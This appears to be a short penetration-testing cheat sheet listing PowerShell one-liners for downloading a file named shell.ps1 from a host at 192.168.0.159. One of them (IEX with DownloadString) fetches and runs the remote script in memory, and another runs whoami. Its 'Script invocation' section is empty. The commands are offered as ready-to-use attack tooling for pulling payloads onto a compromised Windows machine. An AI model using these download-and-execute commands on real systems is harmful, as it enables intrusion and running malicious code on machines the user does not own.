## Download file using powershell

```console
# Using WebClient.Downloadfile
D:\> powershell -command "(New-Object System.Net.WebClient).DownloadFile(\"http://192.168.0.159:8002/shell.ps1\", \"shell.ps1\")"

# Using WebClient.DownloadString
D:\> powershell "IEX (New-Object System.Net.WebClient).DownloadString(\"http://192.168.0.159:8002/shell.ps1\");"

# Invoke-WebRequuest
D:\> powershell Invoke-WebRequest -Uri "http://192.168.0.159:8002/shell.ps1" -OutFile "shell.ps1"

# Requiring authentication
D:\> powershell Invoke-WebRequest -Uri "http://192.168.0.159:8002/shell.ps1" -OutFile "shell.ps1" -Credential GetCredential 

# Execute generic CMD from powershell
D:\> powershell -command "whoami"'
```

## Script invocation
```console

```

## Util infos
https://github.com/davehardy20/PowerShell-Scripts
